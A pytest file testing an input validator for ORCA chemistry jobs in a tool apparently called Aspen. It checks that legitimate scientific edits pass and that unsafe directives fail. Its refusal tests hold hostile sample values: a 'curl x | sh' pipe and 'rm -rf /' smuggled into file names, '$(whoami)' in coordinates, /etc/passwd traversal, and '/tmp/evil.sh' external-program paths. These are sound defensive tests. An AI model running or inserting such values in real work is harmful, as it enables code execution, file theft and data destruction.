"""
Tests for the input-file validator (``aspen/inputs.py``).

The validator has two jobs that pull against each other, so both halves are
asserted with roughly equal weight:

* **Stay out of the way of science.** Aspen must be free to change functionals,
  basis sets, resources, geometry, charge, and to add ordinary blocks. A validator
  that blocks a legitimate edit is a validator people route around.
* **Refuse the narrow set of directives that stop being data** — anything that
  names a program to run or a path outside the run directory.

The block vocabulary is closed rather than denylisted because the group's real
inputs use only eight ``%`` blocks, so the cost of "refuse what nobody needs" is
near zero and it covers the directive nobody thought to denylist.

Note what these tests do *not* claim: a submitted job runs unjailed, so this is a
guardrail against the careless member and an injected model — the actors the threat
model names — not a boundary against a determined author.
"""

import pytest

# A realistic ORCA input in the shape the group actually writes: keyword line,
# a couple of blocks, then an inline geometry.
REAL = """\
!UKS B3LYP RIJCOSX Def2-TZVP tightscf SlowConv defgrid2 largeprint Printbasis nbo

%pal nprocs 4 end

%output PrintLevel Large
        Print[P_MOs] 1
        end

%maxcore 2000

* xyz 0 1
C         -0.69855       -0.70970       -1.55898
O         -1.32985       -1.38066       -2.21662
*
"""


# --------------------------------------------------------------------------- #
# Legitimate science must pass
# --------------------------------------------------------------------------- #
def test_a_real_input_is_accepted(sut):
    assert sut.inputs.validate(REAL) == []


@pytest.mark.parametrize("description,edit", [
    ("functional swap",   lambda t: t.replace("B3LYP", "CAM-B3LYP")),
    ("basis swap",        lambda t: t.replace("Def2-TZVP", "def2-QZVPP")),
    ("add an opt",        lambda t: t.replace("!UKS", "!UKS Opt TightOpt AnFreq")),
    ("raise cores",       lambda t: t.replace("nprocs 4", "nprocs 32")),
    ("raise maxcore",     lambda t: t.replace("%maxcore 2000", "%maxcore 4000")),
    ("add %tddft",        lambda t: t.replace("%maxcore", "%tddft nroots 20 end\n%maxcore")),
    ("add %scf",          lambda t: t.replace("%maxcore", "%scf maxiter 500 end\n%maxcore")),
    ("add %cpcm",         lambda t: t.replace("%maxcore", "%cpcm smd true end\n%maxcore")),
    ("negative charge",   lambda t: t.replace("* xyz 0 1", "* xyz -2 1")),
    ("open shell",        lambda t: t.replace("* xyz 0 1", "* xyz 0 3")),
    ("relative xyzfile",  lambda t: t.split("* xyz 0 1")[0] + "* xyzfile 0 1 struct.xyz\n"),
])
def test_ordinary_edits_are_accepted(sut, description, edit):
    """If any of these start failing, the validator has become an obstacle."""
    assert sut.inputs.validate(edit(REAL)) == [], description


def test_every_block_the_group_actually_uses_is_allowed(sut):
    """Grounded in a scan of the real trees, not in guesswork."""
    for block in ("maxcore", "pal", "basis", "geom", "output", "method",
                  "qmmm", "pointcharges"):
        assert block in sut.inputs.orca_allowed_blocks(), block


# --------------------------------------------------------------------------- #
# The truly bad things must be refused
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("description,addition", [
    ("compound scripting", "%compound\n  New_Step\n  StepEnd\nend\n"),
    ("output redirection", '%base "/sdf/home/someone/.env"\n'),
    ("external program",   '%method\n  ProgExt "/tmp/evil.sh"\nend\n'),
    ("external xtb",       '%method\n  ProgXTB "/tmp/xtb"\nend\n'),
    ("script assignment",  '%geom\n  Script = "/tmp/x.sh"\nend\n'),
    ("mo read escape",     '%moinp "../../../etc/passwd"\n'),
    ("unknown block",      "%somethingnobodyneeds\n  key 1\nend\n"),
])
def test_dangerous_directives_are_refused(sut, description, addition):
    problems = sut.inputs.validate(REAL + "\n" + addition)
    assert problems, f"{description} must be refused"


def test_the_extopt_keyword_is_refused(sut):
    """It reaches an external optimiser without needing a block at all."""
    assert sut.inputs.validate(REAL.replace("!UKS", "!UKS ExtOpt"))


def test_an_absolute_geometry_path_is_refused(sut):
    text = REAL.split("* xyz 0 1")[0] + "* xyzfile 0 1 /etc/passwd\n"
    problems = sut.inputs.validate(text)
    assert problems and "absolute path" in problems[0]


def test_shell_characters_in_a_path_are_refused(sut):
    problems = sut.inputs.validate(REAL + '\n%pointcharges "a.pc; curl x | sh"\n')
    assert problems


def test_the_escape_hatch_cannot_re_enable_a_denied_block(sut, monkeypatch):
    """An operator must not be able to allow %compound by listing it."""
    monkeypatch.setattr(sut, "ORCA_EXTRA_BLOCKS", ["compound", "base"], raising=False)
    assert "compound" not in sut.inputs.orca_allowed_blocks()
    assert "base" not in sut.inputs.orca_allowed_blocks()
    assert sut.inputs.validate(REAL + "\n%compound\nend\n")


def test_the_escape_hatch_does_allow_a_legitimate_block(sut, monkeypatch):
    assert sut.inputs.validate(REAL + "\n%brandnew\n  x 1\nend\n")
    monkeypatch.setattr(sut, "ORCA_EXTRA_BLOCKS", ["brandnew"], raising=False)
    assert sut.inputs.validate(REAL + "\n%brandnew\n  x 1\nend\n") == []


# --------------------------------------------------------------------------- #
# Runaway resources — the careless case, not the malicious one
# --------------------------------------------------------------------------- #
def test_runaway_cores_and_memory_are_refused(sut):
    assert sut.inputs.validate(REAL.replace("nprocs 4", "nprocs 4096"))
    assert sut.inputs.validate(REAL.replace("%maxcore 2000", "%maxcore 900000"))


def test_an_absurd_charge_or_multiplicity_is_refused(sut):
    assert sut.inputs.validate(REAL.replace("* xyz 0 1", "* xyz 9999 1"))
    assert sut.inputs.validate(REAL.replace("* xyz 0 1", "* xyz 0 99"))


# --------------------------------------------------------------------------- #
# Fail closed
# --------------------------------------------------------------------------- #
def test_an_unknown_code_is_refused_not_waved_through(sut):
    """Adding a code means writing its validator. Until then, no submission.

    Otherwise the guardrail would be silently absent for exactly the code nobody
    has looked at yet.
    """
    problems = sut.inputs.validate(REAL, code="gaussian")
    assert problems and "no input validator" in problems[0]


def test_an_empty_input_is_refused(sut):
    assert sut.inputs.validate("")
    assert sut.inputs.validate("   \n\n")


def test_check_raises_with_every_problem_listed(sut):
    with pytest.raises(sut.inputs.InputError) as exc:
        sut.inputs.check(REAL + '\n%compound\nend\n%base "/x"\n')
    message = str(exc.value)
    assert "%compound" in message and "%base" in message


# --------------------------------------------------------------------------- #
# Structured geometry edits — the common path, done by substitution
# --------------------------------------------------------------------------- #
def test_replace_charge_leaves_everything_else_byte_identical(sut):
    out = sut.inputs.replace_geometry(REAL, charge=-2)
    assert "* xyz -2 1" in out
    # Every line above the geometry header is untouched.
    assert out.split("* xyz")[0] == REAL.split("* xyz")[0]
    assert sut.inputs.validate(out) == []


def test_replace_geometry_with_new_coordinates(sut):
    coords = ["Fe 0.0 0.0 0.0", "O  1.5 0.0 0.0"]
    out = sut.inputs.replace_geometry(REAL, charge=3, multiplicity=6, coordinates=coords)
    assert "* xyz 3 6" in out
    assert "Fe" in out and "O " in out
    assert "C         -0.69855" not in out, "the old geometry must be gone"
    assert sut.inputs.validate(out) == []


def test_switch_to_an_xyzfile_reference(sut):
    out = sut.inputs.replace_geometry(REAL, xyz_filename="opt.xyz")
    assert "* xyzfile 0 1 opt.xyz" in out
    assert sut.inputs.validate(out) == []


def test_an_unsafe_xyz_filename_is_refused(sut):
    for bad in ("/etc/passwd", "../../x.xyz", "a.xyz; rm -rf /"):
        with pytest.raises(sut.inputs.InputError):
            sut.inputs.replace_geometry(REAL, xyz_filename=bad)


def test_replacing_geometry_needs_a_geometry_block(sut):
    with pytest.raises(sut.inputs.InputError):
        sut.inputs.replace_geometry("!B3LYP\n%maxcore 100\n", charge=0)


# --------------------------------------------------------------------------- #
# Reading coordinates out of a .xyz
# --------------------------------------------------------------------------- #
def test_coordinates_from_xyz_drops_the_comment_line(sut):
    xyz = "2\nsome comment with CHARGE=0 and junk\nFe 0.0 0.0 0.0\nO 1.5 0.0 0.0\n"
    coords = sut.inputs.coordinates_from_xyz(xyz)
    assert len(coords) == 2
    assert not any("comment" in c for c in coords), (
        "the comment is free text from a file Aspen did not write — it has no "
        "business appearing in a generated input"
    )
    assert coords[0].startswith("Fe")


def test_a_truncated_xyz_is_refused(sut):
    with pytest.raises(sut.inputs.InputError) as exc:
        sut.inputs.coordinates_from_xyz("5\ncomment\nFe 0 0 0\n")
    assert "truncated" in str(exc.value)


def test_a_bogus_xyz_is_refused(sut):
    for bad in ("", "not-a-count\nc\nFe 0 0 0\n", "1\nc\n$(whoami) 0 0 0\n",
                "1\nc\nFe x y z\n"):
        with pytest.raises(sut.inputs.InputError):
            sut.inputs.coordinates_from_xyz(bad)
